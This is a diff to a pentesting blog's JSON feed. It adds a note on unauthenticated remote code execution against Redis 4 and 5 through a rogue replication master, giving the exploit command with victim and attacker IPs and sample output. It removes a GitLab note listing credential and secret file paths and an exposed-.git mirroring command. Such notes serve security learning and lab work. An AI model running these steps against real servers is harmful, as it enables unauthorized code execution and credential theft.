@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
+            "title": "Redis 4 and 5 Unauthenticated RCE",
+            "summary": "Redis 4 and 5 Unauthenticated RCE",
+            "content_text": "OverviewYou can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.::NOTE::Looks like this is for linux onlySteps  Download this exploit  Follow instruction on how to compile exp.so  Run it from attacker machine# 10.10.70.254 - victim ip# 10.11.40.33 - attacker ippython3 redis-master.py -r 10.10.70.254 -p 6379 -L 10.11.40.33 -P 8888 -f RedisModulesSDK/exp.so -c \"id\"  Sample output...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)Notes  If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.  This might not work if commands such as MODULE is not available on the target redis instanceReferences  https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf  Pavel Toporkov - Redis post-exploitation",
+            "content_html": "<h1 id=\"overview\">Overview</h1><p>You can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.</p><p>::NOTE::</p><p>Looks like this is for linux only</p><p><img src=\"/spindel/assets/Redis%204%20and%205%20Unauthenticated%20RCE/357378FF-379F-4EFA-81F7-4A12EC11EEFC.png\" alt=\"\" /></p><h1 id=\"steps\">Steps</h1><ul>  <li>Download this <a href=\"https://github.com/vulhub/redis-rogue-getshell\">exploit</a></li>  <li>Follow instruction on how to compile <code class=\"language-plaintext highlighter-rouge\">exp.so</code></li>  <li>Run it from attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.70.254 - victim ip</span><span class=\"c\"># 10.11.40.33 - attacker ip</span>python3 redis-master.py <span class=\"nt\">-r</span> 10.10.70.254 <span class=\"nt\">-p</span> 6379 <span class=\"nt\">-L</span> 10.11.40.33 <span class=\"nt\">-P</span> 8888 <span class=\"nt\">-f</span> RedisModulesSDK/exp.so <span class=\"nt\">-c</span> <span class=\"s2\">\"id\"</span></code></pre></div></div><ul>  <li>Sample output</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)</code></pre></div></div><h1 id=\"notes\">Notes</h1><ul>  <li>If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.</li>  <li>This might not work if commands such as <code class=\"language-plaintext highlighter-rouge\">MODULE</code> is not available on the target redis instance</li></ul><h1 id=\"references\">References</h1><ul>  <li>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</li>  <li><a href=\"https://www.youtube.com/watch?v=Jmv-0PnoJ6c\">Pavel Toporkov - Redis post-exploitation</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
+            
+            
+            
+            "tags": ["rce","foothold"],
+            
+            "date_published": "2022-05-08T00:00:00+08:00",
+            "date_modified": "2022-05-08T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
             "title": "LSA Secrets",
             "summary": "LSA Secrets",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-02-27T00:00:00+08:00",
             "date_modified": "2022-02-27T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/02/25/gitlab",
-            "title": "Gitlab",
-            "summary": "Gitlab",
-            "content_text": "Credentialsroot:&lt;random token set during installation&gt;Finding version  Log in &gt; helpInteresting Files and Directories# contains private key/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml# contains root password#   gitlab_rails['initial_root_password'] = '&lt;my_strong_password&gt;'/etc/gitlab/gitlab.rbcat /etc/gitlab/gitlab.rb | grep git_data_dirs# - Contains repositories from other users# - Looks like only contains bare repos, no actual files/var/opt/gitlab/git-data/repositories# You can find clues here about private or hidden reposgrep -r securedocker /var/log/gitlab 2&gt; /dev/nullCommands# gitlab console - can be used for management such as password#                  resets# https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.htmlgitlab-rails console# Mirroring an exposed .git directory and recreating the fileswget --mirror -I .git 10.10.10.70/.gitgit checkout -- .Other Enumeration Methods  Check public projects  Check users  Check activities  Look for private projectsSignup  There might be whitelisted domains on emails you can use  Try to use the domain of the boxReferences  Pentesting Git source repositories",
-            "content_html": "<h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>root:&lt;random token <span class=\"nb\">set </span>during installation&gt;</code></pre></div></div><h2 id=\"finding-version\">Finding version</h2><ul>  <li>Log in &gt; help</li></ul><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains private key</span>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml<span class=\"c\"># contains root password</span><span class=\"c\">#   gitlab_rails['initial_root_password'] = '&lt;my_strong_password&gt;'</span>/etc/gitlab/gitlab.rb<span class=\"nb\">cat</span> /etc/gitlab/gitlab.rb | <span class=\"nb\">grep </span>git_data_dirs<span class=\"c\"># - Contains repositories from other users</span><span class=\"c\"># - Looks like only contains bare repos, no actual files</span>/var/opt/gitlab/git-data/repositories<span class=\"c\"># You can find clues here about private or hidden repos</span><span class=\"nb\">grep</span> <span class=\"nt\">-r</span> securedocker /var/log/gitlab 2&gt; /dev/null</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># gitlab console - can be used for management such as password</span><span class=\"c\">#                  resets</span><span class=\"c\"># https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html</span>gitlab-rails console<span class=\"c\"># Mirroring an exposed .git directory and recreating the files</span>wget <span class=\"nt\">--mirror</span> <span class=\"nt\">-I</span> .git 10.10.10.70/.gitgit checkout <span class=\"nt\">--</span> <span class=\"nb\">.</span></code></pre></div></div><h2 id=\"other-enumeration-methods\">Other Enumeration Methods</h2><ul>  <li>Check public projects</li>  <li>Check users</li>  <li>Check activities</li>  <li>Look for private projects</li></ul><h2 id=\"signup\">Signup</h2><ul>  <li>There might be whitelisted domains on emails you can use</li>  <li>Try to use the domain of the box</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.errno.fr/Attacking_source_repositories.html\">Pentesting Git source repositories</a></li></ul>",
-            "url": "https://mvineza.github.io/spindel/2022/02/25/gitlab",
-            
-            
-            
-            "tags": ["git","enum"],
-            
-            "date_published": "2022-02-25T00:00:00+08:00",
-            "date_modified": "2022-02-25T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
